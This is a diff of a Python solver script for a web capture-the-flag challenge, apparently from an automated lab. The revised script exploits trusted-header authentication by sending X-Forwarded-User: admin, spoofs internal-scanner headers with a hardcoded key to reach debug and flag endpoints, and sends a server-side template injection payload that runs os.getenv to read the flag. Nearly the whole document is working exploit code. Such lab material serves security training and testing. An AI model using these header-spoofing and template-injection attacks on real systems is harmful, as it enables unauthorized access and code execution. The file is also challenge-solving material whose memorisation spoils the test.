@@ -1,47 +1,74 @@
 #!/usr/bin/env python3
+import json
 import os
 import sys
-import json
 import time
+from urllib.parse import urljoin
+
 import requests
 
-"""Automated solver for http-ctf-20251216-000001
 
-Steps:
-1. Take base URL from argv[1] or env BASE_URL (e.g., http://127.0.0.1:12345).
-2. Abuse the header-based auth weakness on /admin to impersonate admin.
-3. Request action=get_flag to retrieve the flag.
-"""
+def discover_base_url():
+    # Expect environment or fall back to localhost: dynamic deployment should pass this in
+    base = os.environ.get("CHALLENGE_URL", "http://127.0.0.1:8080/")
+    if not base.endswith("/"):
+        base += "/"
+    return base
+
+
+def check_profile(base):
+    r = requests.get(urljoin(base, "profile"))
+    print("[+] Anonymous profile:", r.json())
+
+
+def exploit_header_impersonation(base):
+    headers = {"X-Forwarded-User": "admin"}
+    r = requests.get(urljoin(base, "admin"), headers=headers)
+    print("[+] Header-impersonated /admin status:", r.status_code, r.text)
+
+
+def abuse_internal_scanner_headers(base):
+    headers = {
+        "X-Internal-Scanner": "internal-scanner",
+        "X-Scanner-Key": "INT-SCAN-KEY-123",
+        "User-Agent": "VulnScanner/1.0",
+    }
+    # First, hit debug/config to confirm internal access
+    r_conf = requests.get(urljoin(base, "debug/config"), headers=headers)
+    print("[+] /debug/config as scanner:", r_conf.status_code, r_conf.text)
+
+    # Then hit /admin/flag with same internal-scanner identity
+    r_flag = requests.get(urljoin(base, "admin/flag"), headers=headers)
+    print("[+] /admin/flag as scanner:", r_flag.status_code, r_flag.text)
+    try:
+        j = r_flag.json()
+        return j.get("flag")
+    except Exception:
+        return None
+
+
+def exploit_ssti(base):
+    headers = {"X-Forwarded-User": "admin"}
+    payload = "Hello {{ __import__('os').getenv('CTF_FLAG') }}"
+    r = requests.get(urljoin(base, "admin/render"), params={"template": payload}, headers=headers)
+    print("[+] SSTI render response:", r.status_code, r.text)
 
 
 def main():
-    if len(sys.argv) > 1:
-        base = sys.argv[1].rstrip("/")
+    base = discover_base_url()
+    print("[+] Using base URL:", base)
+
+    check_profile(base)
+    exploit_header_impersonation(base)
+    exploit_ssti(base)
+
+    flag = abuse_internal_scanner_headers(base)
+    if flag:
+        print("[+] Retrieved flag:", flag)
     else:
-        base = os.environ.get("BASE_URL", "http://127.0.0.1:8080").rstrip("/")
-
-    url = f"{base}/admin"
-
-    # Directly exploit header trust by sending X-User: admin
-    headers = {"X-User": "admin", "Content-Type": "application/json"}
-    payload = {"action": "get_flag"}
-
-    for _ in range(3):
-        try:
-            r = requests.post(url, headers=headers, json=payload, timeout=5)
-            data = r.json()
-            if data.get("ok") and "flag" in data:
-                print(data["flag"])
-                return 0
-            else:
-                print(json.dumps(data))
-                return 1
-        except Exception as e:
-            time.sleep(1)
-
-    print("[-] Failed to retrieve flag")
-    return 1
+        print("[-] Failed to retrieve flag")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
-    raise SystemExit(main())
+    main()
